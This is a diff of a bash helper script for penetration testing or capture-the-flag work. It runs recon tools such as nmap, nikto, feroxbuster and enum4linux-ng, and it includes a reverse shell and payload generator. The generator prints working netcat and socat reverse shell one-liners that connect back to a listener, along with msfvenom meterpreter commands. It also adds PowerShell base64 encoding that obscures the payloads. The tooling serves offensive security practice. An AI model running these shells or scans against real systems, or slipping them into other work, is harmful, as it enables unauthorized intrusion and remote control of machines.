@@ -12,7 +12,6 @@ ARCHIVE_DIR="${BASE_DIR}/archive"
 DEFAULT_HTTP_PORT=8000
 
 SCREENSHOT_TOOL="flameshot"
-PREFERRD_FILEMANAGER="ranger"     # change to manager of choosing: vim, mc, etc.
 PREFERRED_EDITOR="code"           # fallback: vnote, typora, etc.
 
 mkdir -p "$BASE_DIR" "$ARCHIVE_DIR"
@@ -54,6 +53,7 @@ Usage:
   sync <ip>                               Sync time to DC, otherwise set-ntp true
   rdp <ip> <user> <pass>                  Quick xfreerdp with dynamic res
   rev <type> [lhost] <port>               Generate reverse shell / payload string
+  rev list                                List available shells, payloads and options
 
 Options:
   --force      Reuse existing directory
@@ -109,6 +109,12 @@ get_vpn_ip() {
     msg_err "$VPN_INTERFACE not found → fallback: $ip"
   fi
   echo "$ip"
+}
+
+# Print full command syntax
+run_cmd() {
+  echo -e "\033[1;34m[EXEC]\033[0m $*\n"
+  "$@"
 }
 
 # ---- Project Management ----
@@ -240,7 +246,7 @@ launch_tmux_session() {
     fi
     return
   fi
-  # Create main window and split it vert
+  # Create  windows and split it them
   tmux new-session -d -s "$session" -n "main" -c "$CURRENT_PROJECT"
   tmux split-window -v -t "$session:main"  -c "$CURRENT_PROJECT"
  
@@ -313,7 +319,7 @@ start_http_server() {
   local srv_dir="$CURRENT_PROJECT/tmp"
   mkdir -p "$srv_dir"
   msg_ok "Serving $srv_dir on http://$(get_vpn_ip):$port/"
-  (cd "$srv_dir" && python3 -m http.server "$port")
+  (cd "$srv_dir" && run_cmd python3 -m http.server "$port")
 }
 
 add_scope_item() {
@@ -337,7 +343,7 @@ quick_rdp() {
   require_current_project
   command -v xfreerdp3 >/dev/null 2>&1 || { msg_err "xfreerdp not found"; exit 1; }
   [[ $# -ne 3 ]] && { echo "Usage: rdp <ip> <user> <pass>"; exit 1; }
-  xfreerdp3 /v:"$1" /u:"$2" /p:"$3" /dynamic-resolution +auto-reconnect +clipboard /drive:neverlook,"$CURRENT_PROJECT/tmp"
+  run_cmd xfreerdp3 /v:"$1" /u:"$2" /p:"$3" /dynamic-resolution +auto-reconnect +clipboard /drive:neverlook,"$CURRENT_PROJECT/tmp"
 }
 
 sync_time() {
@@ -348,7 +354,7 @@ sync_time() {
     return 1
   else
     local dcip="$1"
-    sudo timedatectl set-ntp false; sudo ntpdate -u "$dcip"
+    run_cmd sudo timedatectl set-ntp false; run_cmd sudo ntpdate -u "$dcip"
     msg_ok "Time synced to $dcip"
   fi
 }
@@ -397,7 +403,7 @@ scan_target() {
 
   # --- TCP Fast Scan ---
   msg_info "Starting Fast TCP Scan on $ip..."
-  nmap -Pn -n -v --min-rate 500 --max-retries 1 -p- -oG "$log_dir/all_ports.gnmap" "$ip" # > /dev/null
+  run_cmd nmap -Pn -vvv --min-rate 500 --max-retries 1 -p- -oG "$log_dir/all_ports.gnmap" "$ip" # > /dev/null
 
   # Parse the ports
   local ports
@@ -412,7 +418,7 @@ scan_target() {
 
   # --- TCP Deep Scan ---
   msg_info "Starting Version/Script Scan on active ports..."
-  nmap -Pn -n -sCV -v -p "$ports" -oA "$log_dir/detailed" "$ip"
+  run_cmd nmap -Pn -n -sCV -p "$ports" -oA "$log_dir/detailed" "$ip"
 
   local target_url="http://$ip"
   local redirect_url=""
@@ -436,8 +442,7 @@ scan_target() {
   # NFS Check
   if [[ ",$ports," == *",2049,"* ]]; then
       msg_ok "NFS detected!"
-      # Showmount -e for finding exposed backups/configs
-      showmount -e "$ip" | tee "$log_dir/nfs_shares.txt"
+      run_cmd showmount -e "$ip" | tee "$log_dir/nfs_shares.txt"
   fi
 
   # --- Prompt Actions ---
@@ -449,30 +454,36 @@ scan_target() {
       if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
         msg_info "Spawning onesixtyone in 'scans' window..."      
         tmux split-window -t "$target_win" -c "$proj" \
-        "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $ip | tee $log_dir/snmp.txt"
+        "run_cmd onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $ip | tee $log_dir/snmp.txt"
       fi
   fi
 
   # Web Check
   if [[ ",$ports," =~ ,(80|443), ]]; then
     msg_ok "Web detected!"
+
+    read -p "[?] Run whatweb to check for versioning? [Y/n] " -r ans
+    if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
+      msg_info "Running whatweb..."
+      run_cmd whatweb -v -a3 --log-verbose "$log_dir/whatweb.txt" "$target_url" || msg_err "whatweb failed or not installed"
+    fi
+
     read -p "[?] Run wafw00f to check for firewalls? [Y/n] " -r ans
     if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
       msg_info "Running wafw00f..."
-      wafw00f "$target_url" || msg_err "wafw00f failed or not installed"
+      run_cmd wafw00f "$target_url" || msg_err "wafw00f failed or not installed"
     fi
 
-    read -p "[?] Run aggressive HTTP scans (Feroxbuster/Wapiti)? [Y/n] " -r ans
+    read -p "[?] Run nikto to check for vulnerabilities?? [Y/n] " -r ans
     if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
-      msg_ok "Spawning Ferox & Nuclei in 'scans' window..."
-      
-      tmux split-window -t "$target_win" -c "$proj" \
-        "feroxbuster -u http://$ip --rate-limit 15 -t 10 -o $log_dir/ferox_$ip.txt; read"
+      msg_info "Running nikto..."
+      run_cmd nikto -o "$log_dir/nikto.txt" --maxtime=180s -C all -h "$target_url" || msg_err "nikto failed or not installed"
+    fi
 
-      tmux split-window -t "$target_win" -c "$proj" \
-        "wapiti -u $target_url -f txt -o $log_dir/wapiti.txt; read"
-    else
-      msg_info "Skipping HTTP scans."
+    read -p "[?] Run feroxbuster dir scan? [Y/n] " -r ans
+    if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
+      msg_info "Running feroxbuster..."
+      run_cmd feroxbuster -u "$target_url" -o "$log_dir/ferox_anx.txt" || msg_err "Feroxbuster failed or not installed"
     fi
   fi
 
@@ -481,8 +492,7 @@ scan_target() {
     msg_ok "Windows SMB (microsoft-ds) detected!"
     read -p "[?] Run Enum4linux-ng? [Y/n] " -r ans
     if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
-      tmux split-window -t "$target_win" -c "$proj" \
-        "enum4linux-ng -A $ip -oA \"$log_dir/enum4linux_$ip\"; read"
+      run_cmd enum4linux-ng -A "$ip" -oA "$log_dir/enum4linux" || msg_err "enum4linux failed or not installed"
     fi
   elif [[ ",$ports," == *",445,"* ]]; then
     msg_info "SMB detected but banner does not match 'microsoft-ds'. Likely Linux/Samba."
@@ -491,19 +501,16 @@ scan_target() {
   # UDP Scan
   if (( udp == 1 )); then
     msg_info "UDP Scan requested. Prompting for sudo..."
-    msg_info '[*] Starting UDP Top 1000...'
-    sudo nmap -Pn -sU --top-ports 1000 -v -oA "$log_dir/udp_top1000_$ip" "$ip"
+    msg_info '[*] Starting UDP Top 100...'
+    run_cmd sudo nmap -Pn -sU --top-ports 100 -v -oA "$log_dir/udp_top1000_$ip" "$ip"
     msg_ok '[+] UDP Done'
   fi
-  # Uncomment below to focus on scans
-  # tmux select-layout -t "$target_win" tiled
 }
 
 # ---- Reverse Shell & Payload Generator ----
 
 generate_payload() {
   local type="${1:-}"
-  local encoder="omz_urlencode"
   shift || true
 
 
@@ -540,8 +547,8 @@ Available Types:
   msf-met-win        msfvenom x64 meterpreter stageless (EXE)
     
   #### Web ####
+  socat-web          socat TCP full tty
   bash-web           bash TCP interactive
-  socat-web          socat full tty
   msf-aspx           msfvenom Windows x64 meterpreter aspx
   msf-php            msfvenom PHP meterpreter raw
   msf-jsp            msfvenom Java meterpreter raw
@@ -583,7 +590,7 @@ EOF
   local payload=""
   case "$type" in
     nc-trad)
-      echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
+      echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $lhost $lport >/tmp/f"
       ;;
     nc-openbsd)
       echo "nc -e /bin/sh $lhost $lport"
@@ -619,12 +626,12 @@ EOF
       payload="msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f aspx -o met.exe"
       ;;
     socat)
-      echo -e "Listener:\nsocat file:`tty`,raw,echo=0 tcp-listen:$lport\n\nPayload:"
-      payload="socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:$lport"
+      echo -e "Listener:\nsocat -dd file:\`tty\`,raw,echo=0 TCP-LISTEN:$lport\n\nPayload:"
+      payload="socat -dd EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP:$lhost:$lport"
       ;;
     socat-web)
-      echo -e "Listener:\nsocat file:`tty`,raw,echo=0 tcp-listen:$lport\n\nPayload:"
-      payload="socat tcp-connect:$lhost:$lport exec:bash,pty,stderr,setsid,sigint"
+      echo -e "Listener:\nsocat TCP-LISTEN:$lport,reuseaddr,fork PTY,stderr,setsid,sigint,sane\n\nPayload:"
+      payload="socat TCP:$lhost:$lport EXEC:'bash -li',pty,stderr,setsid,sigint,sane"
       ;;
     msf-php)
       payload="msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > shell.php"
@@ -650,10 +657,30 @@ EOF
       ;;
   esac
 
-  # Apply Encoding Modifiers if requested
+# Apply Encoding Modifiers if requested
   if (( encode_b64 )); then
-    payload=$(echo -n "$payload" | iconv -t UTF-16LE | base64 | tr -d '\n')
-    payload="powershell -enc $payload"
+    # Pass the payload to Python for leading-wrapper stripping and encoding
+    payload=$(python3 -c '
+import sys
+import base64
+import re
+
+p = sys.argv[1].strip()
+
+if not re.match(r"^powershell(\.exe)?\s+", p, re.IGNORECASE):
+    print("ERROR: --b64 modifier is only valid for PowerShell payloads.", file=sys.stderr)
+    sys.exit(1)
+
+stripped = re.sub(r"^powershell(\.exe)?\s+(-[a-zA-Z]+\s+)*-c\s+", "", p, flags=re.IGNORECASE)
+
+if (stripped.startswith("\"") and stripped.endswith("\"")) or (stripped.startswith("\x27") and stripped.endswith("\x27")):
+    stripped = stripped[1:-1]
+
+utf16_bytes = stripped.encode("utf-16le")
+b64_encoded = base64.b64encode(utf16_bytes).decode("utf-8")
+print(f"powershell -enc {b64_encoded}")
+' "$payload") || exit 1
+
   elif (( encode_url )); then
     payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
   fi
